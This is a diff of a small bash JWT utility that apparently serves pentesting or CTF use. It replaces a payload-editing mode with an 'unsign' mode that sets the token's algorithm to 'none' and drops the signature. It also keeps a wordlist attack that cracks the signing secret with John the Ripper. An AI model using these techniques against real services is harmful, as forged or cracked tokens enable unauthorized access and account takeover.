@@ -58,29 +58,23 @@ attack() {
 	john -wordlist=$wl --format=$john_alg $temp_file
 	rm $temp_file
 }
-# Modify JWT token payload
-modify() {
+# Disable token signing algorithm
+unsign() {
 	if [[ $# -lt 2 || $2 == '-h' || $2 == '--help' ]]; then
 		echo "USAGE: $1 JWT"
 		exit
 	fi
 	data=($(decode _ $2))
-	echo ${data[@]}
-	echo "Current payload:
-${data[1]}"
-	read -ep 'New payload:
-' new_payload
-	echo $new_payload
-	echo -n "$(echo $2 | cut -d. -f 1).$(echo -n $new_payload | base64 -w 0).$(echo $2 | cut -d. -f 3)" 
+	echo -n "$(echo -n '{"typ":"JWT","alg":"none"}' | base64 -w 0).$(echo $2 | cut -d. -f 2)." 
 }
 
 case $1 in
-	create|modify|decode|attack) $1 $@;;
+	create|unsign|decode|attack) $1 $@;;
 	*) echo "USAGE: $0 MODE [-h | MODE_ARGS]
 Simple tool for JWT creation/modification/decoding/attacking.
 MODES:
 create - create token
-modify - modify token payload
+unsign - set token alg to \"none\" and remove signature
 decode - decode token
 attack - weak password attack on given token"
 	exit 1;;
